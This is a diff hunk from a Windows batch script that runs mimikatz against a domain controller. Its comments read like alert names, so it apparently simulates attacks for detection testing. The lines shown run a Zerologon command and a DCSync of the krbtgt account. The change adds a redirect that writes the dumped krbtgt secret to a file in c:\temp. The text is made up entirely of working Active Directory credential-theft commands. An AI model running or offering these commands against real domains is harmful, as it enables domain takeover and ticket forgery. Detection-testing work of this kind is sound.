@@ -92,7 +92,7 @@ mimikatz.exe "privilege::debug" "lsadump::zerologon /target:%mydc% /account:dc1$
 TIMEOUT /T 120
 
 rem **Suspected DCSync attack (replication of directory services) 
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:%mydom% /user:krbtgt" "exit"
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:%mydom% /user:krbtgt" "exit" >> c:\temp\krbtgt-export.txt
 TIMEOUT /T 120
 
 rem **Domain dominance 
